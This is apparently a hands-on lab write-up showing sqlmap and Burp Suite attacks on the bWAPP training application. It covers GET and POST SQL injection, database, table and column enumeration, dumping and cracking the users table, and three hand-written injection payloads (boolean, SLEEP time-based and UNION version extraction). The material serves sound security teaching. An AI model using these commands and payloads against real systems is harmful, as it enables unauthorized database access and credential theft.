## What is this lab about?
A hands-on lab demonstrating **sqlmap** for automated SQL injection detection and exploitation. Covers GET-based and POST-based SQLi, authenticated scanning with cookies, database enumeration, table/column extraction, and manual payload verification via Burp Suite Repeater.

---

## Key Concepts Explained

**sqlmap**
- Open-source automated SQL injection tool written in Python.
- Detects and exploits SQLi in GET, POST, cookie, and header parameters.
- Can enumerate databases, tables, columns, dump data, and crack password hashes.
- Supports multiple DBMS: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.

**GET vs POST SQL Injection**
- **GET** — Parameters in URL (`?title=joe&action=search`), visible and bookmarkable.
- **POST** — Parameters in request body (form data), not visible in URL, used for forms.

**Cookie-Based Authentication**
- sqlmap needs the session cookie to access authenticated pages.
- Captured from Burp Suite proxy or browser dev tools.

## Commands & Workflow

### Step 1 — Environment Setup
```bash
# Identify target
ip addr show
nmap -sV 192.36.17.3
# Result: Port 80 (HTTP), Port 3306 (MySQL)

# Target app: bWAPP (bee/bug to login)
```

### Step 2 — Capture Authenticated Cookie via Burp Suite
```bash
# 1. Open Burp Suite, enable proxy (127.0.0.1:8080)
# 2. In Firefox: Enable FoxyProxy → Burp
# 3. Navigate to http://192.36.17.3
# 4. Login with: bee / bug
# 5. Burp intercepts the POST login request
# 6. Copy the PHPSESSID cookie from the request

# Example captured cookie:
# Cookie: PHPSESSID=abc123; security_level=0
```

### Step 3 — GET-Based SQL Injection with sqlmap
```bash
# Basic vulnerability detection
sqlmap -u "http://192.36.17.3/sqli_1.php?title=joe&action=search" \
  --cookie="PHPSESSID=abc123; security_level=0" \
  -p title

# Output:
# [INFO] heuristic test shows parameter 'title' might be injectable
# [INFO] possible DBMS: MySQL
# [INFO] testing for SQL injection on GET parameter 'title'
# [INFO] parameter 'title' is vulnerable
```

### Step 4 — Enumerate Databases
```bash
# List all databases
sqlmap -u "http://192.36.17.3/sqli_1.php?title=joe&action=search" \
  --cookie="PHPSESSID=abc123; security_level=0" \
  -p title --dbs

# Output:
# [4 databases]
# [*] bWAPP
# [*] information_schema
# [*] mysql
# [*] performance_schema
```

### Step 5 — Enumerate Tables
```bash
# List tables in bWAPP database
sqlmap -u "http://192.36.17.3/sqli_1.php?title=joe&action=search" \
  --cookie="PHPSESSID=abc123; security_level=0" \
  -p title -D bWAPP --tables

# Output:
# [5 tables]
# [*] blog
# [*] heroes
# [*] movies
# [*] users
# [*] visitors
```

### Step 6 — Enumerate Columns
```bash
# List columns in 'users' table
sqlmap -u "http://192.36.17.3/sqli_1.php?title=joe&action=search" \
  --cookie="PHPSESSID=abc123; security_level=0" \
  -p title -D bWAPP -T users --columns

# Output:
# [columns in bWAPP.users]
# [*] admin
# [*] password
# [*] email
# [*] ... (other columns)
```

### Step 7 — Dump Data
```bash
# Dump specific columns from users table
sqlmap -u "http://192.36.17.3/sqli_1.php?title=joe&action=search" \
  --cookie="PHPSESSID=abc123; security_level=0" \
  -p title -D bWAPP -T users -C admin,password,email --dump

# Output:
# Hashed passwords detected
# sqlmap asks: "Do you want to crack them via dictionary-based attack?"
# Uses default dictionary if none specified
# Results show usernames and (cracked/plaintext) passwords
```

## POST-Based SQL Injection

### Step 8 — Capture POST Request in Burp
```bash
# 1. Navigate to SQL Injection (POST/Search) page in bWAPP
# 2. Enable Burp Intercept
# 3. Submit search form with any value (e.g., "hello")
# 4. Burp captures the POST request

# Example captured POST request:
POST /sqli_6.php HTTP/1.1
Host: 192.36.17.3
Cookie: PHPSESSID=abc123; security_level=0
Content-Type: application/x-www-form-urlencoded

title=hello&action=search
```

### Step 9 — Save Request to File
```bash
# In Burp: Right-click request → Copy to file
# Save as: /root/request.txt
# Ensure entire request including body is saved
```

### Step 10 — sqlmap with Request File
```bash
# Run sqlmap against saved POST request
sqlmap -r /root/request.txt -p title

# sqlmap reads the full HTTP request from file
# Automatically detects POST parameters
# Tests for SQL injection on 'title' parameter

# Output: New payloads discovered for POST-based SQLi
```

## Manual Payload Verification (Burp Repeater)

### Step 11 — Verify sqlmap Payloads
```bash
# Send captured request to Burp Repeater
# Test sqlmap-generated payloads manually:

# Payload 1 (from sqlmap):
title=joe' OR NOT 2377=2377-- -&action=search
# Result: SQL syntax error (false positive or wrong syntax)

# Payload 2 (from sqlmap):
title=joe' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -&action=search
# Result: Time-based blind SQLi test

# Payload 3 (version extraction):
title=joe' UNION SELECT NULL,NULL,NULL,@@version-- -&action=search
# Result: MySQL version 5.5.47 on Ubuntu (CONFIRMED)
```

## sqlmap Flags Reference

| Flag | Purpose | Example |
|---|---|---|
| `-u` | Target URL | `-u "http://target/page.php?id=1"` |
| `-r` | Request file (for POST) | `-r request.txt` |
| `-p` | Target parameter | `-p id` |
| `--cookie` | Session cookie | `--cookie="PHPSESSID=abc"` |
| `--dbs` | Enumerate databases | `--dbs` |
| `-D` | Specify database | `-D bWAPP` |
| `--tables` | Enumerate tables | `--tables` |
| `-T` | Specify table | `-T users` |
| `--columns` | Enumerate columns | `--columns` |
| `-C` | Specify columns | `-C admin,password` |
| `--dump` | Dump table data | `--dump` |
| `--batch` | Auto-answer prompts | `--batch` |

## Key Takeaways

| Finding | Impact | Notes |
|---|---|---|
| `title` parameter injectable (GET) | **CRITICAL** | Full database access via sqlmap |
| `title` parameter injectable (POST) | **CRITICAL** | Form-based SQLi also exploitable |
| 4 databases enumerated | **HIGH** | bWAPP, mysql, information_schema |
| `users` table with password hashes | **CRITICAL** | Credential compromise possible |
| MySQL 5.5.47 on Ubuntu | **MEDIUM** | Version info for further attacks |

- **sqlmap automates the tedious parts** — payload generation, DBMS fingerprinting, enumeration.
- **Always verify findings manually** — sqlmap payloads may not always work; use Burp Repeater to confirm.
- **Authentication cookies are essential** — Without them, sqlmap can't reach protected pages.
- **POST requests need `-r` flag** — Save the full HTTP request including headers and body.
- **Hash cracking** — sqlmap can attempt automatic cracking; for better results, export hashes to John/Hashcat.
- **Version extraction** (`@@version`) confirms successful injection and helps identify known CVEs.
- **Business impact**: SQLi = complete database compromise = customer data, credentials, financial records.
